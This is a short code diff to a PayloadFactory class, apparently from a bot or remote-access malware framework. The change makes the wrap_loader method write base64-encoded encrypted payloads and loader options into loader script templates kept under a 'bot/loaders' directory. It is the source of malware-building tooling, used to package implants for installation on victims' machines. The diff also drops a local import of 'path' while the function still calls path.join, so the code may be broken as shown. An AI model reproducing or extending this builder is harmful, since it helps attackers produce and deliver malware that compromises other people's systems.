@@ -622,10 +622,14 @@ class PayloadFactory:
         return result
 
     def wrap_loader(self, loader_name: str, loader_options: dict, payload: str) -> str:
-        """Wrap the encrypted payload in a loader script."""
+        """Wrap the encrypted payload in a loader script.
+
+        The loader templates ship with ``LOADER_OPTIONS = {}`` and
+        ``PAYLOAD_BASE64 = ""`` placeholders; those exact lines are replaced
+        with the real values so the installed script actually receives the
+        configuration and the encrypted payload.
+        """
         import base64
-        from textwrap import dedent
-        from os import path
 
         loader_path = path.join(
             path.dirname(__file__), path.pardir, "bot", "loaders",
@@ -635,14 +639,14 @@ class PayloadFactory:
         with open(loader_path, "r") as f:
             loader_content = f.read()
 
-        if "LOADER_OPTIONS =" not in loader_content:
-            loader_content += "\nLOADER_OPTIONS = {}\n".format(str(loader_options))
+        b64_payload = base64.b64encode(payload.encode()).decode()
 
-        if "PAYLOAD_BASE64 =" not in loader_content:
-            b64_payload = base64.b64encode(payload.encode()).decode()
-            loader_content = loader_content.replace(
-                "PAYLOAD_BASE64 =", f'PAYLOAD_BASE64 = "{b64_payload}"'
-            )
+        # Replace the placeholder values the template ships with.  ``str()`` on
+        # a dict yields a valid Python literal, so the result stays executable.
+        loader_content = loader_content.replace(
+            "LOADER_OPTIONS = {}", "LOADER_OPTIONS = {}".format(str(loader_options)))
+        loader_content = loader_content.replace(
+            'PAYLOAD_BASE64 = ""', 'PAYLOAD_BASE64 = "{}"'.format(b64_payload))
 
         return loader_content
 
